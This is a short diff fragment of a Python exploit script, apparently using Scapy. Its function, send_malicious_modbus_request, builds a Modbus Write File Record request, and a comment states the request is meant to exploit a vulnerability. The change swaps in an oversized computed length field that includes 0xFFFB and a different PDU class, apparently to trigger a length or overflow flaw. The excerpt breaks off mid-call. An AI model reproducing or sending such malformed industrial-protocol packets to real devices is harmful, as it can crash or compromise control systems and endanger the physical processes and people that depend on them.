@@ -8,7 +8,7 @@ logging.basicConfig(level=logging.DEBUG)
 def send_malicious_modbus_request():
     try:
         # Crafting a malicious Modbus request to exploit the vulnerability
-        modbus_request = ModbusADURequest(transId=1, protoId=0, len=6, unitId=1) / ModbusPDUWriteFileRecordRequest(
+        modbus_request = ModbusADURequest(transId=1, protoId=0, len=7 + 2 + 1 + 1 + 2 + 0xFFFB, unitId=1) / ModbusPDU15WriteFileRecordRequest(
             referenceType=6,
             fileNumber=0,
             recordNumber=0,
